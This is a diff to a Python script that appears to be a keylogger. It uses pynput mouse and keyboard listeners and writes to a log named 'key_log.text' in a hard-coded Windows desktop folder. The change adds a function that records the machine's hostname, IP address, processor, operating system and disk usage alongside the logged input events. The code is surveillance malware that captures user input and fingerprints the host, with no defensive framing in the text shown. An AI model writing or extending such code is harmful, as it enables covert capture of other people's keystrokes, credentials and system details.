@@ -22,14 +22,29 @@ import sys
 import threading
 from pynput import mouse
 from pynput import keyboard
+import psutil
 
-# Create log to default path
 
-logging.basicConfig(filename=("log.text"),level =logging.DEBUG, format='%(asctime)s:%(message)s')
+log_dir=r"C:\Users\Mr. jarvis\Desktop\test/" 
+logging.basicConfig(filename=(log_dir + "key_log.text"),level =logging.DEBUG, format='%(asctime)s:%(message)s', datefmt='%d-%m %H:%M')
 
-# Create log to Specified path
-#log_dir=r"C:\Users\Mr. jarvis\Desktop\test/" 
-#logging.basicConfig(filename=(log_dir + "key_log.text"),level =logging.DEBUG, format='%(asctime)s:%(message)s')
+
+def system_information():
+    hostname = socket.gethostname()
+    ip = socket.gethostbyname(hostname)
+    plat = platform.processor()
+    system = platform.system()
+    machine = platform.machine()
+    hdd = psutil.disk_usage('/')
+    
+    logging.info('========Hostname==== :'+hostname+'=============')
+    logging.info('========Ip========== :'+ip+'=============')
+    logging.info('========Platform==== :'+plat+'=============')
+    logging.info('========System====== :'+system+'=============')
+    logging.info('========Machine===== :'+machine+'=============')
+    logging.info('========HDD===== :'+str(hdd))
+
+system_information()
 
 def on_move(x, y):
     logging.info("Mouse moved to ({0}, {1})".format(x, y))
